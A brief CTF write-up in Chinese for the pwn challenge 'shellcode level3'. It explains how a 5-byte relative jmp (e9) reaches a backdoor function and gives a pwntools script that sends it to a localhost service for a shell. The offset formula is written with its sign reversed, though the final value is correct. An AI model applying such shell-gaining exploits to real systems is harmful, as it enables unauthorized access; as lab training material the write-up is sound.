# shellcode level3

## 文件分析

下载`shellcode_level3`, NX on, PIE off, Canary off, RELRO partial  
ghidra分析为64位程序

## 逆向

程序读入5字节并执行，且存在后门函数  
考虑跳转指令执行shellcode跳转到此处

Shellcode: e8 -> call; e9 -> jmp  
后面可跟相对地址（跳转地址-跳转命令所在地址+5）  
相对地址为4Bytes

全局变量code地址0x404089，后门函数`givemeshell`地址0x4011d6  
那么相对地址为0x404089 + 5 - 0x4011d6 = 0xffffd148 `int32_t`

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 46239)
sh.sendline(b'\xe9' + p32(0xffffd148))
sh.interactive()
```

Done.
